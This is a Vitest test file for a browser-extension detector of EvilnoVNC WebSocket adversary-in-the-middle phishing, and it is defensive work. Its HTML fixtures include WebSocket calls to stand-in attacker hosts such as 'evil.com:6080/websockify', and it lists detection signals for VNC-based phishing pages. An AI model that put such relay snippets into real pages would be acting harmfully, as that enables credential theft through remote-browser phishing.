/**
 * extension/__tests__/vnc_guard.test.js
 *
 * Tests for VNCGuard — EvilnoVNC WebSocket AiTM Detection
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { JSDOM } from 'jsdom';
import {
  checkNoVncLibraryDetected,
  checkCanvasPrimaryInteraction,
  checkWebSocketToNonStandardPort,
  checkRfbProtocolIndicators,
  checkLoginContextWithoutForms,
  calculateVncRiskScore,
  injectVncWarningBanner,
} from '../content/vnc_guard.js';

function makeDoc(html = '<html><head></head><body></body></html>') {
  const dom = new JSDOM(html);
  return dom.window.document;
}

afterEach(() => {
  vi.unstubAllGlobals();
});

/* ================================================================== */
/*  checkNoVncLibraryDetected                                           */
/* ================================================================== */

describe('checkNoVncLibraryDetected', () => {
  it('detects noVNC script src (rfb.js)', () => {
    const doc = makeDoc(`
      <html><body>
        <script src="/vendor/noVNC/core/rfb.js"></script>
      </body></html>
    `);
    const signals = checkNoVncLibraryDetected(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].id).toBe('vnc:novnc_library_detected');
    expect(signals[0].weight).toBe(0.40);
    expect(signals[0].source).toBe('script_src');
  });

  it('detects noVNC script src (websock.js)', () => {
    const doc = makeDoc(`
      <html><body>
        <script src="websock.js"></script>
      </body></html>
    `);
    expect(checkNoVncLibraryDetected(doc)).toHaveLength(1);
  });

  it('detects noVNC reference in inline script', () => {
    const doc = makeDoc(`
      <html><body>
        <script>
          // Initialize noVNC client
          var vnc = require('noVNC');
        </script>
      </body></html>
    `);
    const signals = checkNoVncLibraryDetected(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].source).toBe('inline_script');
  });

  it('detects RFB constructor in inline script', () => {
    const doc = makeDoc(`
      <html><body>
        <script>
          var rfb = new RFB(document.getElementById('screen'), wsUrl);
        </script>
      </body></html>
    `);
    const signals = checkNoVncLibraryDetected(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].source).toBe('global_signature');
  });

  it('does NOT flag pages without noVNC references', () => {
    const doc = makeDoc(`
      <html><body>
        <script src="/app.js"></script>
        <script>var x = 1;</script>
      </body></html>
    `);
    expect(checkNoVncLibraryDetected(doc)).toHaveLength(0);
  });

  it('returns empty for null doc', () => {
    expect(checkNoVncLibraryDetected(null)).toHaveLength(0);
  });
});

/* ================================================================== */
/*  checkCanvasPrimaryInteraction                                       */
/* ================================================================== */

describe('checkCanvasPrimaryInteraction', () => {
  it('detects large canvas with no input elements', () => {
    vi.stubGlobal('innerWidth', 1280);
    vi.stubGlobal('innerHeight', 720);
    const doc = makeDoc(`
      <html><body>
        <canvas width="1280" height="720"></canvas>
      </body></html>
    `);
    const signals = checkCanvasPrimaryInteraction(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].id).toBe('vnc:canvas_primary_interaction');
    expect(signals[0].weight).toBe(0.30);
  });

  it('does NOT flag canvas when input elements are present', () => {
    vi.stubGlobal('innerWidth', 1280);
    vi.stubGlobal('innerHeight', 720);
    const doc = makeDoc(`
      <html><body>
        <canvas width="1280" height="720"></canvas>
        <input type="text" />
      </body></html>
    `);
    expect(checkCanvasPrimaryInteraction(doc)).toHaveLength(0);
  });

  it('does NOT flag small canvas', () => {
    vi.stubGlobal('innerWidth', 1280);
    vi.stubGlobal('innerHeight', 720);
    const doc = makeDoc(`
      <html><body>
        <canvas width="200" height="200"></canvas>
      </body></html>
    `);
    expect(checkCanvasPrimaryInteraction(doc)).toHaveLength(0);
  });

  it('does NOT flag page with no canvas', () => {
    const doc = makeDoc('<html><body><div>Content</div></body></html>');
    expect(checkCanvasPrimaryInteraction(doc)).toHaveLength(0);
  });

  it('returns empty for null doc', () => {
    expect(checkCanvasPrimaryInteraction(null)).toHaveLength(0);
  });
});

/* ================================================================== */
/*  checkWebSocketToNonStandardPort                                     */
/* ================================================================== */

describe('checkWebSocketToNonStandardPort', () => {
  it('detects WebSocket to VNC port 6080', () => {
    const doc = makeDoc(`
      <html><body>
        <script>
          var ws = new WebSocket('ws://evil.com:6080/websockify');
        </script>
      </body></html>
    `);
    const signals = checkWebSocketToNonStandardPort(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].id).toBe('vnc:websocket_to_nonstandard_port');
    expect(signals[0].port).toBe(6080);
  });

  it('detects WebSocket to VNC port 5900', () => {
    const doc = makeDoc(`
      <html><body>
        <script>
          var ws = new WebSocket('wss://attacker.com:5900/vnc');
        </script>
      </body></html>
    `);
    const signals = checkWebSocketToNonStandardPort(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].port).toBe(5900);
  });

  it('does NOT flag WebSocket to standard port 443', () => {
    const doc = makeDoc(`
      <html><body>
        <script>
          var ws = new WebSocket('wss://legitimate.com:443/ws');
        </script>
      </body></html>
    `);
    expect(checkWebSocketToNonStandardPort(doc)).toHaveLength(0);
  });

  it('does NOT flag non-VNC ports', () => {
    const doc = makeDoc(`
      <html><body>
        <script>
          var ws = new WebSocket('ws://example.com:3000/socket');
        </script>
      </body></html>
    `);
    expect(checkWebSocketToNonStandardPort(doc)).toHaveLength(0);
  });

  it('does NOT flag page without WebSocket', () => {
    const doc = makeDoc('<html><body><script>var x = 1;</script></body></html>');
    expect(checkWebSocketToNonStandardPort(doc)).toHaveLength(0);
  });

  it('returns empty for null doc', () => {
    expect(checkWebSocketToNonStandardPort(null)).toHaveLength(0);
  });
});

/* ================================================================== */
/*  checkRfbProtocolIndicators                                          */
/* ================================================================== */

describe('checkRfbProtocolIndicators', () => {
  it('detects "RFB 003" in script', () => {
    const doc = makeDoc(`
      <html><body>
        <script>
          var version = 'RFB 003.008';
        </script>
      </body></html>
    `);
    const signals = checkRfbProtocolIndicators(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].id).toBe('vnc:rfb_protocol_indicators');
    expect(signals[0].matched).toBe('RFB 003');
  });

  it('detects "tight" encoding reference in script', () => {
    const doc = makeDoc(`
      <html><body>
        <script>
          var encoding = 'tight';
        </script>
      </body></html>
    `);
    expect(checkRfbProtocolIndicators(doc)).toHaveLength(1);
  });

  it('detects "copyrect" in script', () => {
    const doc = makeDoc(`
      <html><body>
        <script>var enc = 'copyrect';</script>
      </body></html>
    `);
    expect(checkRfbProtocolIndicators(doc)).toHaveLength(1);
  });

  it('does NOT flag pages without RFB indicators', () => {
    const doc = makeDoc(`
      <html><body>
        <script>var x = 'normal code';</script>
      </body></html>
    `);
    expect(checkRfbProtocolIndicators(doc)).toHaveLength(0);
  });

  it('returns empty for null doc', () => {
    expect(checkRfbProtocolIndicators(null)).toHaveLength(0);
  });
});

/* ================================================================== */
/*  checkLoginContextWithoutForms                                       */
/* ================================================================== */

describe('checkLoginContextWithoutForms', () => {
  it('detects "Sign In" text with no forms or inputs', () => {
    const doc = makeDoc(`
      <html><head><title>Sign In - Microsoft</title></head>
      <body><div>Please sign in to continue</div></body></html>
    `);
    const signals = checkLoginContextWithoutForms(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].id).toBe('vnc:login_context_without_forms');
    expect(signals[0].weight).toBe(0.15);
  });

  it('detects "password" text with no forms', () => {
    const doc = makeDoc(`
      <html><body><div>Enter your password to continue</div></body></html>
    `);
    expect(checkLoginContextWithoutForms(doc)).toHaveLength(1);
  });

  it('does NOT flag when form elements are present', () => {
    const doc = makeDoc(`
      <html><head><title>Sign In</title></head>
      <body>
        <form><input type="text" /></form>
      </body></html>
    `);
    expect(checkLoginContextWithoutForms(doc)).toHaveLength(0);
  });

  it('does NOT flag when input elements are present', () => {
    const doc = makeDoc(`
      <html><head><title>Login</title></head>
      <body><input type="email" /></body></html>
    `);
    expect(checkLoginContextWithoutForms(doc)).toHaveLength(0);
  });

  it('does NOT flag pages without login context text', () => {
    const doc = makeDoc(`
      <html><head><title>Welcome</title></head>
      <body><div>Welcome to our website</div></body></html>
    `);
    expect(checkLoginContextWithoutForms(doc)).toHaveLength(0);
  });

  it('returns empty for null doc', () => {
    expect(checkLoginContextWithoutForms(null)).toHaveLength(0);
  });
});

/* ================================================================== */
/*  calculateVncRiskScore                                               */
/* ================================================================== */

describe('calculateVncRiskScore', () => {
  it('returns 0 for no signals', () => {
    const { riskScore, signalList } = calculateVncRiskScore([]);
    expect(riskScore).toBe(0);
    expect(signalList).toHaveLength(0);
  });

  it('sums signal weights correctly', () => {
    const signals = [
      { id: 'vnc:novnc_library_detected', weight: 0.40 },
      { id: 'vnc:canvas_primary_interaction', weight: 0.30 },
    ];
    const { riskScore } = calculateVncRiskScore(signals);
    expect(riskScore).toBeCloseTo(0.70, 2);
  });

  it('caps at 1.0', () => {
    const signals = [
      { id: 'a', weight: 0.40 },
      { id: 'b', weight: 0.30 },
      { id: 'c', weight: 0.25 },
      { id: 'd', weight: 0.20 },
      { id: 'e', weight: 0.15 },
    ];
    const { riskScore } = calculateVncRiskScore(signals);
    expect(riskScore).toBe(1.0);
  });

  it('returns null/empty for null input', () => {
    const { riskScore, signalList } = calculateVncRiskScore(null);
    expect(riskScore).toBe(0);
    expect(signalList).toHaveLength(0);
  });
});

/* ================================================================== */
/*  injectVncWarningBanner                                              */
/* ================================================================== */

describe('injectVncWarningBanner', () => {
  it('injects banner into document', () => {
    const dom = new JSDOM('<html><head></head><body></body></html>');
    vi.stubGlobal('document', dom.window.document);

    injectVncWarningBanner(0.70, [
      { id: 'vnc:novnc_library_detected', weight: 0.40 },
      { id: 'vnc:canvas_primary_interaction', weight: 0.30 },
    ]);

    const banner = dom.window.document.getElementById('phishops-vnc-banner');
    expect(banner).not.toBeNull();
    expect(banner.textContent).toContain('VNC-Based Phishing');
  });

  it('does not inject duplicate banners', () => {
    const dom = new JSDOM('<html><head></head><body></body></html>');
    vi.stubGlobal('document', dom.window.document);

    const signals = [{ id: 'vnc:test', weight: 0.50 }];
    injectVncWarningBanner(0.50, signals);
    injectVncWarningBanner(0.50, signals);

    const banners = dom.window.document.querySelectorAll('#phishops-vnc-banner');
    expect(banners).toHaveLength(1);
  });
});
